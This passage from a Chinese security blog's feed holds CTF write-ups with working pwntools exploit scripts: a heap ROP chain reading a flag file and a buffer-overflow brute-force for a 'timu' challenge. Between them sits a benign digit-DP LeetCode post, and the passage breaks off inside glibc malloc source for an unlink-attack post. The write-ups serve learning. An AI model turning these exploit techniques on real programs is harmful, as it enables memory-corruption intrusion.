class="line">wp_edit(r, <span class="number">4</span>, p64(edit_stack + <span class="number">0x10</span> + <span class="number">8</span>))</span><br><span class="line">wp_add(r, <span class="number">4</span>, <span class="number">0x50</span>)</span><br><span class="line">wp_add(r, <span class="number">4</span>, <span class="number">0x50</span>)</span><br><span class="line">wp_show(r, <span class="number">4</span>)</span><br><span class="line">code_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0xfe1</span></span><br><span class="line">log.info(<span class="string">&#x27;code_base =&gt; %#x&#x27;</span>%(code_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop: read(0, buf, 0x200)</span></span><br><span class="line">edit_stack = edit_stack + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">shellcode = p64(code_base + <span class="number">0x104a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(code_base + elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(edit_stack + <span class="number">0x8</span> * <span class="number">8</span>) + p64(<span class="number">8</span> * <span class="number">31</span> + <span class="built_in">len</span>(<span class="string">&#x27;flag&#x27;</span>) + <span class="number">1</span>) + p64(code_base + <span class="number">0x1030</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)[:-<span class="number">1</span>]</span><br><span class="line">wp_edit(r, <span class="number">4</span>, shellcode)</span><br><span class="line"></span><br><span class="line">edit_stack = edit_stack + <span class="number">0x8</span> * <span class="number">8</span></span><br><span class="line">flag_addr = edit_stack + <span class="number">8</span> * <span class="number">31</span></span><br><span class="line">shellcode = p64(<span class="number">0</span>) * <span class="number">7</span> + p64(code_base + <span class="number">0x1053</span>) + p64(flag_addr) + p64(code_base + <span class="number">0x1051</span>) + p64(<span class="number">4</span>) + p64(<span class="number">0</span>) + p64(lib_base + lib.sym[<span class="string">&#x27;open&#x27;</span>]) + p64(code_base + <span class="number">0x104a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(code_base + elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">3</span>) + p64(flag_addr) + p64(<span class="number">0x40</span>) + p64(code_base + <span class="number">0x1030</span>) + p64(<span class="number">0</span>) * <span class="number">7</span> + p64(code_base + <span class="number">0x1053</span>) + p64(flag_addr) + p64(code_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">r.send(shellcode + <span class="string">&#x27;flag\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">log.info(<span class="string">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数位dp</title>
      <link href="/2021/09/11/%E6%95%B0%E4%BD%8Ddp/"/>
      <url>/2021/09/11/%E6%95%B0%E4%BD%8Ddp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  之前刷其他的题目的时候，看到过<strong>数位dp</strong>解法，但是太菜了，根本看不懂!<br>  今天刷leetcode的每日一题时，题目虽然用了别的方法做出来，但是太丑了，非常多的判断。在看别人的解析的时候，突然看到<a href="https://leetcode-cn.com/problems/non-negative-integers-without-consecutive-ones/solution/shu-wei-dpmo-ban-ji-jie-fa-by-initness-let3/">数位DP模板级解法</a>，一下突然懂了。<br>  特别记录一下这个瞬间，自己又进步了一点。🚩</p><h1 id="数位dp"><a href="#数位dp" class="headerlink" title="数位dp"></a>数位dp</h1><p>  首先，我们正式的<del>(不讲人话)</del>的介绍一下<strong>数位dp</strong>算法</p><blockquote><p>数位dp算法是用来解决如下问题的算法<br>求出在给定区间<script type="math/tex">[A,B]</script>内，符合条件<script type="math/tex">f(i)</script>的数$i$的个数。条件<script type="math/tex">f(i)</script>一般与数的大小无关，而与数的组成有关</p></blockquote><p>  这就是一般的<strong>数位dp</strong>算法的介绍，然后后面就直接跟例题和代码了，大家都是<strong>谜语人</strong>么?<br>  这里我再介绍一下<strong>数位dp</strong>的一种通用解法，从而更好的理解这个优美的算法</p><h1 id="数位dp通用解法"><a href="#数位dp通用解法" class="headerlink" title="数位dp通用解法"></a>数位dp通用解法</h1><p>  一方面，由于前面介绍的条件<script type="math/tex">f(i)</script>与数大小无关，而仅仅与数的组成有关，因此<strong>数位dp</strong>需要通过动态规划的方法，预处理出一个<strong>dp[i][j]</strong>的数组，<strong>dp[i][j]</strong>表示长度为<script type="math/tex">i</script>,最高位为<script type="math/tex">j</script>的符合条件<script type="math/tex">f(num)</script>的个数<br>  另一方面，<strong>数位dp</strong>更多的可以理解为一种根据其数的组成的遍历顺序——该遍历顺序可以让我们有效的结合动态规划解决问题。<br>  即如果对于区间<script type="math/tex">[0,a_{n-1}a_{n-2}...a_{0}]</script>，实际上我们遍历的时候，从最高位向最低位开始遍历(即从第<script type="math/tex">n-1</script>位向第<script type="math/tex">0</script>位遍历);每次遍历第<script type="math/tex">i</script>位的的时候，从<script type="math/tex">0</script>到<script type="math/tex">a_{i} - 1</script>。当遍历结束后，固定第<script type="math/tex">i</script>位为<script type="math/tex">a_{i}</script>，继续以相同的方式遍历后边的数。<br>  可能听起来还是比较迷惑，下面给出一个具体的数值，以及其相关的遍历顺序图<br>  如果我们要遍历<script type="math/tex">[0, 1737]</script>，则其遍历的顺序如下所示<br>  <img src="1737的遍历顺序.PNG" alt="1737的遍历顺序"></p><p>  那么要求解<script type="math/tex">[0, 1737]</script>中，满足符合条件<script type="math/tex">f(i)</script>的数$i$的个数就非常简单了——按照前面的遍历顺序，第<script type="math/tex">i</script>次遍历，前<script type="math/tex">i - 1</script>位是固定知道的，后几位的最高位为<script type="math/tex">a_{i}</script>，则可以调用前面的预处理的数组快速求解</p><h1 id="样例-不含连续1的非负整数"><a href="#样例-不含连续1的非负整数" class="headerlink" title="样例 不含连续1的非负整数"></a>样例 不含连续1的非负整数</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个正整数<script type="math/tex">n</script>，找出小于或等于<script type="math/tex">n</script>的非负整数中，其二进制表示不包含<strong>连续的1</strong>的个数<br><strong>说明:</strong> 1 &lt;= n &lt;= 109</p><blockquote><p><strong>示例1:</strong><br><strong>输入: 5<br>输出: 5<br>解释:</strong><br>下面是带有相应二进制表示的非负整数&lt;= 5：<br>0 : 0<br>1 : 1<br>2 : 10<br>3 : 11<br>4 : 100<br>5 : 101<br>其中，只有整数3违反规则（有两个连续的1），其他5个满足规则。</p></blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/non-negative-integers-without-consecutive-ones">https://leetcode-cn.com/problems/non-negative-integers-without-consecutive-ones</a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>  可以看到，其符合条件与其数字大小完全没有关系，仅仅二进制中的数字组成相关，因此理论上就可以通过<strong>数位dp</strong>进行求解<br>  <strong>数位dp</strong>涉及两个方面:</p><ol><li>预处理的数组<br>根据题目所属，只要不包含连续的1即可，那就是最简单的动态规划，<strong>dp[i][j]</strong>表示长为<script type="math/tex">i</script>的二进制数字，在最高位为<script type="math/tex">j</script>的情况下不包含连续的1的数字个数。其数组长度不超过32(<script type="math/tex">log(10^{9})</script>),每一位就是二进制的<script type="math/tex">0</script>或<script type="math/tex">1</script>。若当前位为<script type="math/tex">0</script>，则低一位是<script type="math/tex">0</script>或<script type="math/tex">1</script>都可以;若当前位为<script type="math/tex">1</script>，则低一位只能是<script type="math/tex">0</script>，其相关代码如下所示<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dp[<span class="number">32</span>][<span class="number">0</span>];</span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>] = dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">dp[i][<span class="number">0</span>] = dp[i][<span class="number">0</span>] + dp[i][<span class="number">1</span>];</span><br><span class="line">dp[i][<span class="number">1</span>] = dp[i][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>数位遍历<br>下面则是按照前面的分析进行遍历，由于是二进制，则每一位只能是<script type="math/tex">0</script>或<script type="math/tex">1</script>，每一个情况如下</li></ol><ul><li>如果当前遍历位的值是0，根据前面的算法，没有可以遍历的值(从<script type="math/tex">0</script>到<script type="math/tex">a_{i}-1</script>)，则继续下一位</li><li><p>如果当前遍历位的值是1，则根据前面的算法，其可以遍历的值是(<script type="math/tex">[a_{n - 1}...a_{i+1}000...0, a_{n-1}...a_{i+1}01...1]</script>)。因此其中满足条件的个数就相当于<strong>dp[i][0]</strong>，即二进制数字长度为i，最高位为0的不包含连续的1的数字的个数</p><p>这里还需要注意一下，当遍历过程中连续两次遍历到1,此时就可以退出遍历了——根据算法，在之后的遍历过程中，这两位始终保留，因此遍历到的数值必然不可能满足条件</p></li></ul><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>  最后，根据前面的题目分析，可以很容易的写出来最终代码<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findIntegers</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">31</span>, res = <span class="number">0</span>, prev_bit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(!(n &gt;&gt; idx)) &#123; --idx; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dp[idx + <span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>] = dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= idx; ++i) &#123;</span><br><span class="line">dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + dp[i - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">dp[i][<span class="number">1</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = idx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line"><span class="type">int</span> current_bit = (n &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(current_bit) &#123; res += dp[i][<span class="number">0</span>]; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(current_bit &amp;&amp; prev_bit) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line"></span><br><span class="line">prev_bit = current_bit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!i) &#123; ++res; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巧妙的爆破</title>
      <link href="/2021/09/10/%E5%B7%A7%E5%A6%99%E7%9A%84%E7%88%86%E7%A0%B4/"/>
      <url>/2021/09/10/%E5%B7%A7%E5%A6%99%E7%9A%84%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  有一说一，题目漏洞很简单，看明白wp后整个题目也不难。但是这个爆破一开始着实没什么思路，特别记录并且总结一下。</p><h1 id="实例-timu"><a href="#实例-timu" class="headerlink" title="实例 timu"></a>实例 timu</h1><p>  点击<a href="timu.tar.gz">附件链接</a></p><h2 id="保护分析"><a href="#保护分析" class="headerlink" title="保护分析"></a>保护分析</h2><p>  首先查看一下程序相关的保护机制<br>  <img src="保护机制.PNG" alt="保护机制"></p><p>  基本上除了栈不可执行以外，就没有开启什么保护机制</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>  这道题目的逻辑结构格外的简单，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">read_num</span><span class="params">(<span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v3; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*((<span class="type">char</span> *)buf + i) &lt;= <span class="number">0x2F</span> || *((<span class="type">char</span> *)buf + i) &gt; <span class="number">0x39</span>) &amp;&amp; *((_BYTE *)buf + i) != <span class="number">0xA</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+0h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [esp+Ch] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> *v9; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = &amp;argc;</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v8 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( read_num(nptr, <span class="number">12u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v8;</span><br><span class="line">    v4 = atoll(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( HIDWORD(v4) ^ HIDWORD(v6) | (<span class="type">unsigned</span> <span class="type">int</span>)v4 ^ (<span class="type">unsigned</span> <span class="type">int</span>)v6 ^ <span class="number">0xCAFEBABE</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  可以看到，其逻辑就是一个读取，然后验证读取。<br>  因此，很明显，我们需要做的就是绕过该验证即可。</p><p>  如果在细心的观察一下该程序，根据ida自动生成的注释信息，我们很容易发现<code>read_num(nptr, 12u)</code>处存在一个缓冲区溢出漏洞——实际上<code>nptr</code>的大小应该是8字节的，因此该程序应该是通过缓冲区溢出，覆盖掉一些重要数据，从而完成验证的绕过。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>  这里我们在详细的分析一下验证部分的代码，即<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( HIDWORD(v4) ^ HIDWORD(v6) | (<span class="type">unsigned</span> <span class="type">int</span>)v4 ^ (<span class="type">unsigned</span> <span class="type">int</span>)v6 ^ <span class="number">0xCAFEBABE</span>)</span><br></pre></td></tr></table></figure></p><p>  实际上，由于$v6 = v8$，而<strong>v8</strong>是<code>int</code>类型的，因此$HIDWORD(v6) = 0$。则为了使验证机制通过，则必须有$HIDWORD(v4) = 0$，即<code>atoll(input[0:12])</code>不要太大即可。</p><p>  下面由于<code>v4 = atoll(nptr)</code>，且<code>(unsigned int)v6</code>恰好可以被输入覆盖掉，因此该条件相当于$atoll(input[0:12]) \otimes u32(input[8:12]) \otimes 0xcafebabe = 0$，即$atoll(input[0:12]) \otimes u32(input[8:12]) = 0xcafebabe$。<br>  因此，我们只要找到满足上面条件的<strong>input</strong>即可。虽然如此，一开始看到这个约束，仍然没有什么较好的思路去解决</p><p>  实际上，我们可以将输入分为<code>input[0:8]</code>和<code>input[8:12]</code>，则约束转换为$(atoll(input[0:8]) \times 10000 + atoll(input[8:12])) \otimes u32(input[8:12]) = 0xcafebabe$，即$atoll(input[0:8]) \times 10000 = (0xcafebabe \otimes u32(input[8:12])) - atoll(input[8:12])$<br>  此时，变成了两个独立变量的等式，我们用更为精确的方式来描述</p><script type="math/tex; mode=display">  \begin{cases}  x = input[0:8] \\  y = input[8:12] \\  x \in [0, 10 ^ {8}) \\  y \in [0, 10 ^ {4}) \\  atoll(x) * 10000 = (0xcafebabe \otimes u32(y)) - atoll(y)  \end{cases}</script><p>  由于<strong>y</strong>变量的范围比较小，则可以通过爆破<strong>y</strong>，从而解出<strong>x</strong>，进而恢复出输入。<br>  根据上述等式，只要$((0xcafebabe \otimes u32(y)) - atoll(y)) \% 10000 = 0$，则<strong>y</strong>满足条件，且有$x = ((0xcafebabe \otimes u32(y)) - atoll(y)) / 10000$</p><p>  剩下就通过脚本进行简单的爆破即可。<br>  <del>看着推起来一帆风顺，甚至有点简单，但是一开始根本没想到要将输入分割成两个无关的变量，数学功底退步了</del></p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>  根据上面的分析，直接写一个小脚本爆破出<strong>x</strong>和<strong>y</strong>，然后拼装成输入即可，如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">待修改数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span><span class="comment"># 32位使用i386</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">execve_file = <span class="string">&#x27;./timu&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAnswer</span>():</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">if</span>((<span class="number">0xcafebabe</span> ^ u32(<span class="built_in">str</span>(i).rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>))) - i) % <span class="number">10000</span> == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">r = process(execve_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">y = getAnswer()</span><br><span class="line">x = <span class="built_in">int</span>(((<span class="number">0xcafebabe</span> ^ u32(<span class="built_in">str</span>(y).rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>))) - y) / <span class="number">10000</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(x * <span class="number">10000</span> + y).rjust(<span class="number">12</span>, <span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">r.recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc_consolidate和unlink</title>
      <link href="/2021/09/08/malloc-consolidate%E5%92%8Cunlink/"/>
      <url>/2021/09/08/malloc-consolidate%E5%92%8Cunlink/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  做题过程中遇见的一道<strong>堆风水</strong>，一开始确实完全没想到思路。借此机会复习一下<strong>malloc_consolidate</strong>和<strong>unlink攻击</strong>相关的知识点</p><h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><p>  实际上，在菜单堆中，我个人还是比较少见利用<strong>malloc_consolidate</strong>的，<del>或者纯粹是我太菜</del>，基本在考虑时下意识的忽略掉这么一个过程，这里特别拉出来研究一下。</p><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><p>  要想分析清楚<strong>malloc_consolidate</strong>函数的逻辑，自然需要查看其源代码信息，这里给出<strong>glibc2.31</strong>版本下的<strong>malloc_consolidate</strong>函数源代码，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span 